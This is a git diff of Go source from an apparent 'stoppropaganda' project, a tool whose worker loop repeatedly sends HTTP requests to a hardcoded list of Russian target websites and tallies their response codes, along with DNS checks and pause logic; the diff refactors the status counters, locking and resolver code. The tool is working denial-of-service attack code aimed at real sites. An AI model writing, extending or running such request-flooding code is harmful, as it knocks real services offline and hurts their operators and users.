@@ -1,12 +1,14 @@
 package stoppropaganda
 
 import (
-	"net"
 	"net/url"
 	"strings"
 	"sync"
 	"time"
 
+	"github.com/erkexzcx/stoppropaganda/internal/stoppropaganda/customresolver"
+	"github.com/erkexzcx/stoppropaganda/internal/stoppropaganda/customtcpdial"
+	"github.com/erkexzcx/stoppropaganda/internal/stoppropaganda/resolvefix"
 	"github.com/valyala/fasthttp"
 )
 
@@ -332,7 +334,7 @@ var targetWebsites = map[string]struct{}{
 	"https://solidwall.ru":      {},
 }
 
-type Website struct {
+type WebsiteStatus struct {
 	Requests     uint   `json:"requests"`
 	Errors       uint   `json:"errors"`
 	LastErrorMsg string `json:"last_error_msg"`
@@ -343,13 +345,40 @@ type Website struct {
 	Counter_code300 uint `json:"status_300"`
 	Counter_code400 uint `json:"status_400"`
 	Counter_code500 uint `json:"status_500"`
+}
 
-	host string
+func (ws *WebsiteStatus) IncreaseCounters(responseCode int) {
+	ws.Requests++
+	switch {
+	case responseCode < 200:
+		ws.Counter_code100++
+	case responseCode < 300:
+		ws.Counter_code200++
+	case responseCode < 400:
+		ws.Counter_code300++
+	case responseCode < 500:
+		ws.Counter_code400++
+	default:
+		ws.Counter_code500++
+	}
+}
 
-	mux            *sync.Mutex
-	pauseMux       *sync.Mutex
-	paused         bool
+func (ws *WebsiteStatus) IncreaseCountersErr(errMsg string) {
+	if !strings.Contains(errMsg, customtcpdial.ErrTooFastDialSpam.Error()) {
+		ws.Requests++
+		ws.Errors++
+		ws.LastErrorMsg = errMsg
+	}
+}
+
+type Website struct {
+	mux    sync.Mutex
+	Status WebsiteStatus
+	host   string
+
+	validateMux    sync.Mutex
 	dnsLastChecked time.Time
+	unpauseTime    time.Time
 
 	req *fasthttp.Request
 }
@@ -373,12 +402,12 @@ func startWebsites() {
 		newReq.Header.Set("Accept", "*/*")
 
 		websites[website] = &Website{
-			host:           websiteURL.Host,
-			Status:         "Initializing",
-			mux:            &sync.Mutex{},
-			pauseMux:       &sync.Mutex{},
-			paused:         false,
+			host: websiteURL.Host,
+			Status: WebsiteStatus{
+				Status: "Initializing",
+			},
 			dnsLastChecked: time.Now().Add(-1 * VALIDATE_DNS_EVERY), // this forces to validate on first run
+			unpauseTime:    time.Now(),
 			req:            newReq,
 		}
 	}
@@ -400,114 +429,80 @@ func startWebsites() {
 	}()
 }
 
+func (ws *Website) paused() bool {
+	ws.mux.Lock()
+	defer ws.mux.Unlock()
+	return time.Now().Before(ws.unpauseTime)
+}
+
+func (ws *Website) setPause(duration time.Duration, reason string) {
+	ws.mux.Lock()
+	defer ws.mux.Unlock()
+	ws.Status.Status = "Paused: " + reason
+	ws.unpauseTime = time.Now().Add(duration)
+}
+
+func (ws *Website) allowedToRun() bool {
+	// Lock, because we don't want multiple validations
+	// running at the same time
+	ws.validateMux.Lock()
+	defer ws.validateMux.Unlock()
+
+	if !ws.paused() {
+		ipAddresses, err := customresolver.GetIPs(ws.host)
+
+		if err != nil {
+			errStr := err.Error()
+			switch {
+			case strings.HasSuffix(errStr, "Temporary failure in name resolution") || strings.HasSuffix(errStr, "connection refused"):
+				ws.setPause(time.Second, "Your DNS servers unreachable or returned an error: "+errStr)
+				return false
+			case strings.HasSuffix(errStr, "no such host"):
+				ws.setPause(5*time.Minute, "Domain does not exist: "+errStr)
+				return false
+			case strings.HasSuffix(errStr, "No address associated with hostname"):
+				ws.setPause(5*time.Minute, "Domain does not have any IPs assigned: "+errStr)
+				return false
+			default:
+				ws.setPause(10*time.Second, errStr)
+				return false
+			}
+		}
+
+		if err = resolvefix.CheckNonPublicIP(ipAddresses); err != nil {
+			ws.setPause(5*time.Minute, err.Error())
+			return false
+		}
+		return true
+	}
+	return false
+}
+
 func runWebsiteWorker(c chan *Website) {
 	// Each worker has it's own response
 	req := fasthttp.AcquireRequest()
 	resp := fasthttp.AcquireResponse()
 
 	for {
-		website := <-c
-		website.req.CopyTo(req) // https://github.com/valyala/fasthttp/issues/53#issuecomment-185125823
-
-		website.pauseMux.Lock()
-		if time.Since(website.dnsLastChecked) >= VALIDATE_DNS_EVERY {
-			ipAddresses, err := getIPs(website.host)
-			website.dnsLastChecked = time.Now()
-
-			if err != nil {
-				website.mux.Lock()
-				switch {
-				case strings.HasSuffix(err.Error(), "Temporary failure in name resolution"):
-					website.Status = "Your DNS servers unreachable or returned an error"
-				case strings.HasSuffix(err.Error(), "connection refused"):
-					website.Status = "Your DNS servers reachable, but refusing connections"
-				case strings.HasSuffix(err.Error(), "no such host"):
-					website.Status = "Domain does not exist"
-				case strings.HasSuffix(err.Error(), "No address associated with hostname"):
-					website.Status = "Domain does not have any IPs assigned"
-				default:
-					website.Status = err.Error()
-				}
-				website.mux.Unlock()
-
-				time.Sleep(10 * time.Second)
-				website.pauseMux.Unlock()
-				continue
-			}
-
-			if containsNonPublicIP(ipAddresses) {
-				website.mux.Lock()
-				website.Status = "Non public IP detected"
-				website.paused = true
-				website.mux.Unlock()
-
-				time.Sleep(5 * time.Minute)
-				website.pauseMux.Unlock()
-				continue
-			}
-
-			website.mux.Lock()
-			website.Status = "Running"
-			website.paused = false
-			website.mux.Unlock()
+		ws := <-c
+		if !ws.allowedToRun() {
+			continue
 		}
-		website.pauseMux.Unlock()
+
+		ws.req.CopyTo(req) // https://github.com/valyala/fasthttp/issues/53#issuecomment-185125823
 
 		// Perform request
 		err := httpClient.DoTimeout(req, resp, *flagTimeout)
 		if err != nil {
-			website.mux.Lock()
-			website.Requests++
-			website.Errors++
-			website.LastErrorMsg = err.Error()
-			website.mux.Unlock()
+			ws.mux.Lock()
+			ws.Status.IncreaseCountersErr("httpClient.Do: " + err.Error())
+			ws.mux.Unlock()
 			continue
 		}
-		responseCode := resp.StatusCode()
 
 		// Increase counters
-		website.mux.Lock()
-		website.Requests++
-		switch {
-		case responseCode < 200:
-			website.Counter_code100++
-		case responseCode < 300:
-			website.Counter_code200++
-		case responseCode < 400:
-			website.Counter_code300++
-		case responseCode < 500:
-			website.Counter_code400++
-		default:
-			website.Counter_code500++
-		}
-		website.mux.Unlock()
+		ws.mux.Lock()
+		ws.Status.IncreaseCounters(resp.StatusCode())
+		ws.mux.Unlock()
 	}
-}
-
-func getIPs(host string) (ips []net.IP, err error) {
-	ipAddresses := make([]net.IP, 0, 1)
-	addr := net.ParseIP(host)
-	if addr == nil {
-		ips, err := net.LookupIP(host)
-		if err != nil {
-			return nil, err
-		}
-		for _, ip := range ips {
-			if ipv4 := ip.To4(); ipv4 != nil {
-				ipAddresses = append(ipAddresses, ipv4)
-			}
-		}
-	} else {
-		ipAddresses = append(ipAddresses, addr)
-	}
-	return ipAddresses, nil
-}
-
-func containsNonPublicIP(ips []net.IP) bool {
-	for _, ip := range ips {
-		if ip.IsPrivate() || ip.IsLoopback() || ip.IsUnspecified() {
-			return true
-		}
-	}
-	return false
 }
